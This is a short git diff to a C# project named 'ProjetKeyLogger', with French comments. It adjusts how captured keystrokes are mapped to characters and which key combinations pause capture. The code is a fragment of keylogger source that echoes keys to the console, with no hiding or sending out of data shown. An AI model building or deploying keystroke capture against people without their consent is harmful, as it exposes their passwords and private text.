@@ -68,7 +68,7 @@ namespace ProjetKeyLogger
 
                 //liste des touches pour lesquelles la saisie est intérrompue
                 //Si une de ces touches est enfoncé, la capture est intérompu exemple : "ctrl + c" la lettre "c" n'est pas capturé
-                int[] list_non_accepte = new int[] { 17 ,18 ,91,16,161 };
+                int[] list_non_accepte = new int[] { 17 ,18 ,91,16};
 
                 //le tableau des touches d'interruptions de la capture est parcouru
                 for (int i = 0; i < list_non_accepte.Length; i++)
@@ -102,6 +102,10 @@ namespace ProjetKeyLogger
 
                                 //On réinitialise l'enregistrement
                                 enregistrement = new Enregistrement();
+                                break;
+
+                            case 16:
+                                Console.Write("SWIFT");
                                 break;
 
                             //si touche majuscule
@@ -180,8 +184,9 @@ namespace ProjetKeyLogger
                             case 219:
                             case 220:
                             case 221:
+                            case 222:
                             case 223:
-                                valeurs = ")*^ !°µ¨ §";
+                                valeurs = ")*^²!°µ¨²§";
                                 if (majuscule == false)
                                 {
                                     Console.Write(valeurs.Substring(codeASCII - 219, 1));
@@ -191,7 +196,11 @@ namespace ProjetKeyLogger
                                     Console.Write(valeurs.Substring(codeASCII - 214, 1));
                                 }
                                 break;
-                               
+
+                            case 226:
+                                Console.Write("<");
+                                break;
+
 
                             default:
                                 if (majuscule == false)
